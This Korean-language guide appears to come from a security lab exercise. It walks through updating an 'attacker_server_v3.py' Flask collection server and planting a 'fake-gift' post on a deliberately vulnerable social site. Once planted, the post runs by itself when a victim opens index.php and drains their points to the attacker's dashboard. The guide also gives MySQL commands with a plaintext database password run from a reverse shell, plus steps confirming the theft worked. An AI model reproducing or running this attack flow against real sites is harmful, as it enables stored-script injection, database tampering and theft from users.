# Flask 서버 v3 업데이트 및 테스트 가이드

## 1. Flask 서버 v3 업데이트

### Ubuntu 서버에 업로드
```bash
# 로컬에서
scp attacker_server_v3.py ubuntu@13.158.67.78:~/

# Ubuntu 서버 접속
ssh ubuntu@13.158.67.78

# 기존 서버 종료
pkill -f attacker_server

# 새 서버 시작
nohup python3 attacker_server_v3.py > server.log 2>&1 &

# 확인
tail -f server.log
```

## 2. 데이터베이스 정리

### 리버스 쉘에서 실행
```bash
# 기존 fake-gift 게시물 삭제
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "DELETE FROM posts WHERE content LIKE '%🎁%';"

# alice 포인트 복구
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "UPDATE users SET points = 500 WHERE username = 'alice';"

# 확인
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT username, points FROM users;"
```

## 3. Flask 서버 리셋
```bash
curl http://13.158.67.78:5000/reset
```

## 4. 새 fake-gift 게시물 생성

### 로컬에서 실행
```bash
python3 post_fake_gift_simple.py
```

## 5. 테스트

### alice로 테스트 (시크릿 모드)
```
1. http://52.78.221.104/login.php
   alice / alice2024

2. 현재 포인트 확인: 500P

3. http://52.78.221.104/index.php 접속
   → fake-gift 자동 실행

4. 브라우저 콘솔(F12) 확인
   → 전송 로그 확인

5. Flask 대시보드 확인
   http://13.158.67.78:5000/
   → 탈취한 포인트: 정확한 금액!

6. DB에서 실제 포인트 확인
   mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT username, points FROM users WHERE username='alice';"
   → alice 포인트 차감 확인
```

## 6. 문제 해결

### 여전히 121000으로 표시되는 경우
- Flask 서버 v3로 업데이트 되었는지 확인
- 로그 확인: `tail -f server.log`
- "중복 요청 무시" 메시지가 나와야 함

### 페이지가 계속 새로고침되는 경우
- `post_fake_gift_simple.py` 사용
- 자동 리다이렉트 코드 제거됨

### localStorage 초기화 방법
```javascript
// 브라우저 콘솔에서
localStorage.removeItem('gift_claimed')
```

## 7. 최종 확인 체크리스트

- [ ] Flask 서버 v3 실행 중
- [ ] 기존 게시물 삭제
- [ ] alice 포인트 500P로 복구
- [ ] Flask 리셋
- [ ] 새 fake-gift 게시물 생성
- [ ] alice 로그인 (시크릿 모드)
- [ ] index.php 접속 → 1회만 실행
- [ ] Flask 대시보드 확인 → 정확한 포인트
- [ ] DB 확인 → 실제 차감 확인
- [ ] 새로고침 → "이미 받으셨습니다" 표시

## 8. 예상 결과

**alice 포인트: 500P인 경우**
- Flask 표시: 약 500P~12,100P (시도한 총 금액)
- 실제 차감: 500P (alice가 가진 만큼만)
- 중복 필터링: 5초 이내 같은 금액 무시

**v3의 개선점:**
- 같은 IP에서 같은 금액을 5초 이내 재요청 시 무시
- 중복 로그는 "⚠️ 중복 요청 무시"로 표시
- 실제 새로운 전송만 카운트

